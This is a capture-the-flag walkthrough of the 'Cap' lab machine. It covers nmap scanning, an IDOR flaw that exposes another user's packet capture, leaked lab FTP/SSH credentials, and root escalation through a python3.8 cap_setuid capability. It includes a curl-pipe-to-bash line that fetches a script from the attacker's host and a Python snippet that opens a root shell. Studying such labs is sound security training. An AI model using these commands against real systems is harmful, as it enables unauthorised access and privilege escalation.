 Cap
20th
 September 2021 / Document No.
D21.100.132
Prepared By: MinatoTW
Machine Author(s): infosecjack
Difficulty: Easy
Classification: Official
Synopsis
Cap is an easy difficulty Linux machine running an HTTP server that performs administrative
functions including performing network captures. Improper controls result in Insecure Direct
Object Reference (IDOR) giving access to another user's capture. The capture contains plaintext
credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to
root.
Skills Required
Web enumeration
Packet capture analysis
Skills learned
IDOR
Exploiting Linux capabilities
Enumeration
Nmap
ports=$(nmap -p- --min-rate=1000 -Pn -T4 10.10.10.245 | grep '^[0-9]' | cut -d
'/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -Pn -sC -sV 10.10.10.245
Nmap reveals three open ports running FTP (21), SSH (22) and an HTTP server on port 80.
FTP
Let's check if FTP allows anonymous access.
The login fails, which means that the anonymous access is disabled. Let's move on to the HTTP
server.
HTTP
According to nmap, port 80 is running Gunicorn, which is a python based HTTP server. Browsing to
the page reveals a dashboard.
Browsing to the IP Config page reveals the output of ifconfig .
Similarly, the Network Status page reveals the output for netstat . This suggests that the
application is executing system commands. Clicking on the Security Snapshot menu item
pauses the page for a few seconds and returns a page as shown below.
Clicking on Download gives us a packet capture file, which can be examined using WireShark.
We don't see anything interesting and the capture just contains HTTP traffic from us.
IDOR
One interesting thing to notice is the URL scheme when creating a new capture, that is of the form
/data/<id> . The id is incremented for every capture. It's possible that there were packet
captures from users before us.
Browsing to /data/0 does indeed reveal a packet capture with multiple packets.
This vulnerability is known as Insecure Direct Object Reference (IDOR), wherein a user can directly
access data owned by another user. Let's examine this capture for potential sensitive data.
Foothold
Opening the ID 0 capture file in Wireshark reveals FTP traffic, including the user authentication.
The traffic is not encrypted, allowing us to retrieve the user credentials i.e. nathan /
Buck3tH4TF0RM3! . These are found to be valid not only for FTP but can be used to login via SSH.
Privilege Escalation
Let's use the linPEAS script to check for privilege escalation vectors. We'll download the latest
version and store it on our VM. Then we can create a Python webserver serving that directory by
using cd to enter the directory with linxpeas.sh and running sudo python3 -m http.server
80 .
From our shell on Cap, we can fetch linpeas.sh with curl and pipe the output directly into
bash to execute it:
The report contains an interesting entry for files with capabilities. The /usr/bin/python3.8 is
found to have cap_setuid and cap_net_bind_service , which isn't the default setting.
According to the documentation, CAP_SETUID allows the process to gain setuid privileges without
the SUID bit set. This effectively lets us switch to UID 0 i.e. root. The developer of Cap must have
given Python this capability to enable the site to capture traffic, which a non-root user can't do.
The following Python commands will result in a root shell:
curl http://10.10.14.24/linpeas.sh | bash
It calls os.setuid() which is used to modify the process user identifier (UID).
import os
os.setuid(0)
os.system("/bin/bash")